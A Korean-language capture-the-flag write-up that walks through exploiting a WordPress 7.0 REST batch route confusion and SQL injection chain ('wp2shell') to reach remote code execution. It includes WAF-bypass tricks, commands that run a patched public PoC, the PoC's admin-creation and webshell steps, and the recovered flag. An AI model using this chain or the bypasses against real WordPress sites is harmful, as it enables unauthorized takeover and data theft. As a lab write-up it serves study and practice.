# COMPFEST 18 CTF — Egg Write-Up (재현용)

- solved by @Yamanachi
- Category: Web Exploitation
- Flag format: `COMPFEST18{...}`
- 핵심: WordPress 7.0의 **wp2shell** (CVE-2026-63030 + CVE-2026-60137)


### 1. 홈페이지 확인

WordPress 버전과 `/batch/v1` REST route에 주목한다. WordPress 7.0.0~7.0.1은 REST batch route confusion과 SQLi를 연결한 wp2shell 체인의 영향 범위다. 취약점 배경은 [NVD CVE-2026-63030](https://nvd.nist.gov/vuln/detail/CVE-2026-63030)를 참고한다.

## 2. Batch API가 살아 있는지 확인

아래는 권한 상승이나 SQLi를 하지 않는 정상 batch 요청이다.

```powershell
$NormalBatch = @{
  requests = @(
    @{ method = 'POST'; path = '/wp/v2/posts'; body = @{} }
  )
} | ConvertTo-Json -Depth 10 -Compress

Invoke-WebRequest `
  -Method POST `
  -Uri "$Target/index.php?rest_route=/batch/v1" `
  -Headers @{ Cookie = $GatewayCookie } `
  -ContentType 'application/json' `
  -Body $NormalBatch |
  Select-Object -ExpandProperty Content
```

성공하면 HTTP `207 Multi-Status`가 나온다. 내부의 post 생성은 권한이 없으므로 `401 rest_cannot_create`여도 정상이다. 여기서 확인하는 것은 **batch endpoint가 동작한다**는 사실뿐이다.

## 3. 왜 공개 PoC가 바로 안 되는가

이 인스턴스는 `X-Egg-WAF`를 둔다.

| 시도 | 결과 |
|---|---|
| 일반 JSON batch + 공개 PoC의 `http://:` primer | `403`, `debug_code: stock-primer-url` |
| 일반 JSON batch + SQL boolean probe | `403`, `debug_code: boolean-probe` |
| form batch + `http:///` primer | 통과 |

`http:///`는 `http://:`와 마찬가지로 WordPress의 URL parser를 실패시키지만, 이 WAF의 고정 문자열 규칙에는 걸리지 않는다. 또한 JSON 대신 `multipart/form-data`로 batch를 전달하면 SQL probe 규칙을 피할 수 있다.

## 4. 재현에 사용할 PoC 준비

예시는 공개 wp2shell PoC를 사용한다.

```powershell
git clone --depth 1 https://github.com/mcipekci/wp2shell.git "$env:TEMP\wp2shell"
Set-Location "$env:TEMP\wp2shell"
git apply 'C:\Users\wwlee\ctf-labs\comppfestctf-2026\egg\wp2shell-ctfd-cookie.patch'
```

위 패치는 이 Write-Up에서 사용한 공개 PoC의 `wp2shell.py`에 `--cookie`를 추가한다. 적용 후 아래 옵션을 사용할 수 있다.

```text
--form
--primer
--cookie
--check
--exec
```

### 중요한 CTFd cookie 처리

`--cookie`는 요청에 단순히 고정 `Cookie:` 헤더를 추가하는 방식이면 안 된다. exploit는 중간에 WordPress에 로그인하고 `wordpress_logged_in_*` cookie를 새로 받는다. 고정 헤더가 이 cookie를 덮어쓰면 관리자 생성까지는 성공해도 로그인 단계에서 실패한다.

따라서 PoC의 HTTP cookie jar에 CTFd cookie를 **초기 cookie로 넣고**, 로그인 뒤 WordPress cookie와 함께 전송하게 해야 한다.

구현 확인 기준은 다음과 같다.

```text
CookieJar = { ctfd_proxy_token=<token> }
로그인 후 CookieJar = { ctfd_proxy_token=<token>, wordpress_logged_in_*=..., ... }
```

패치를 적용하지 않는 경우에는 다음 중 하나를 직접 구현해야 한다.

1. `urllib`/`requests`의 cookie jar에 `ctfd_proxy_token`을 seed한다.
2. WordPress 로그인용 session과 CTFd gateway cookie를 같은 session에서 유지하도록 수정한다.

이 부분이 맞지 않으면 `could not authenticate as the new administrator`가 나오므로, **새 exploit을 계속 실행하지 말고 cookie 처리를 먼저 고친다.**

## 5. 비파괴 검증

실제 권한 상승 전에 반드시 `--check`부터 실행한다.

```powershell
python .\wp2shell.py $Target `
  --check `
  --form `
  --primer 'http:///' `
  --cookie $GatewayCookie `
  --timeout 45
```

기대하는 핵심 출력은 다음과 같다.

```text
[+] VULNERABLE: confusion desync + author__not_in SQLi confirmed ...
RCE-capable (WordPress 6.9.0-7.0.1).
```

다음 중 하나가 나오면 멈추고 원인을 점검한다.

- `stock-primer-url` → primer가 기본값이거나 WAF에 걸렸다.
- `boolean-probe` → `--form`이 적용되지 않았거나 JSON 경로로 전송됐다.
- CTFd access page HTML → gateway cookie가 빠졌거나 만료됐다.
- `NOT vulnerable` → 인스턴스가 갱신됐거나 batch 요청 형식이 잘못됐다.

## 6. Flag 읽기

처음에는 file path를 추측하기보다 환경 변수를 읽는 편이 안전하다. 이 문제의 flag delivery 방식은 environment다.

```powershell
python .\wp2shell.py $Target `
  --form `
  --primer 'http:///' `
  --cookie $GatewayCookie `
  --exec 'env | grep -i "^FLAG="' `
  --timeout 45
```

성공 흐름은 다음과 같다.

```text
[+] injectable via in-band UNION read
[*] oembed cache rows created ...
[+] administrator created ...
[*] authenticating and dropping command runner ...
[*] cleaned up: removed admin ..., cache rows, and webshell
[+] command output:
FLAG=COMPFEST18{...}
```

이 PoC는 다음 순서로 동작한다.

1. batch route confusion으로 일반 요청 검증을 벗어난다.
2. `author__not_in` SQLi로 가짜 post row를 만들고 oEmbed cache에 쓰게 한다.
3. customizer changeset 처리 중 관리자 권한으로 재진입한다.
4. 임시 관리자 계정을 만들고 로그인한다.
5. 일회용 플러그인으로 명령을 실행한다.
6. 플러그인, 임시 계정, oEmbed cache 행을 삭제한다.

실행기가 명령 출력 전에 오류를 내지 않았다면 cleanup 메시지가 반드시 보여야 한다. 계정 생성 직후 로그인에서 실패했다면, cookie jar를 고친 뒤 그 계정으로 로그인해 수동 정리해야 한다.

## 7. Flag

```text
COMPFEST18{th3_3gg_h4s_h4tch3d_Ftl4YiaLTDdIrn4l}
```
